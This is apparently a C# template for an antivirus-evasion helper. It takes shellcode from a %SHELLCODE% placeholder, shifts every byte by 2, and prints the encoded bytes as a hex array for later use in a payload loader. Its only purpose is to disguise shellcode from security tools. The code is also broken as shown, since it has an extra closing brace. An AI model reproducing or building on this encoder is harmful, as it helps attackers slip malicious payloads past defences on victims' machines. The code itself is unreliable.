using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
          
namespace ConsoleApp1
{
    class Program
        {
            static void Main(string[] args)
            {
                //Shellcode
                %SHELLCODE%

                byte[] encoded = new byte[buf.Length];
                for(int i = 0; i < buf.Length; i++)
                {
                    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                }
          
                StringBuilder hex = new StringBuilder(encoded.Length * 2);
                foreach(byte b in encoded)
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }
                Console.WriteLine("The payload is: " + hex.ToString());
            }
        }
    }
}